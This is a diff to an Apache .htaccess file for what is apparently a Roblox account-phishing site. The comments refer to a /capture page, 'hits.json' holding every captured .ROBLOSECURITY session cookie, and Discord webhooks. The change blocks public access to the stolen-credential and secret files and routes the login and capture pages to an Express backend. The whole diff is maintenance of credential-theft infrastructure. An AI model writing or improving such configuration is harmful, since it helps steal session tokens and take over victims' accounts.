@@ -1,19 +1,27 @@
 DirectoryIndex index.php index.html
 RewriteEngine On
 
-# Route /login and /capture directly to PHP scripts
-RewriteRule ^[Ll]ogin/?$ login.php [L,QSA]
-RewriteRule ^[Cc]apture/?$ capture.php [L,QSA]
+# ── Deny direct access to source, secrets and captured data ──
+# Anything that exists as a file was served as-is by the rules further down.
+# That exposed .env (Discord secret, captcha key, session secret), hits.json
+# (every captured .ROBLOSECURITY), sessions.json, webhooks.json and .git.
+# Static assets live in public/ and are the only files meant to be downloadable.
+RewriteRule ^public/ - [L]
+RewriteRule ^(\.env|\.env\..*)$ - [F,L]
+RewriteRule ^\.(git|vercel|cache|freebuff|qoder|agents)(/|$) - [F,L]
+RewriteRule ^(storage|scratch|account-panel|lib|node_modules|setup|actix-web|php)(/|$) - [F,L]
+RewriteRule \.(json|md|txt|log|bat|ps1|py|php|db|sqlite|sql|bak|tmp|map|lock)$ - [F,L]
+RewriteCond %{REQUEST_URI} !^/public/
+RewriteRule ^[^/]+\.(js|css|scss|ts)$ - [F,L]
 
-# Allow direct access to real files and directories
-RewriteCond %{REQUEST_FILENAME} -f [OR]
-RewriteCond %{REQUEST_FILENAME} -d
-RewriteRule ^ - [L]
+# Route /login and /capture to Express. The PHP lane is legacy: server.js owns
+# both paths now, and pointing Apache at login.php bypassed the Node capture
+# page entirely.
 
 # Route static assets from public/ if they exist there
 RewriteCond %{DOCUMENT_ROOT}/public/$1 -f
 RewriteRule ^(.*)$ public/$1 [L]
 
-# Route all dynamic endpoints (/users/*, /communities/*, /groups/*, /games/*, /api/*, /dashboard) to Express on port 3000
+# Route all dynamic endpoints (/users/*, /communities/*, /groups/*, /games/*,
+# /api/*, /dashboard, /login, /capture) to Express on port 3000.
 RewriteRule ^(.*)$ http://127.0.0.1:3000/$1 [P,L]
-
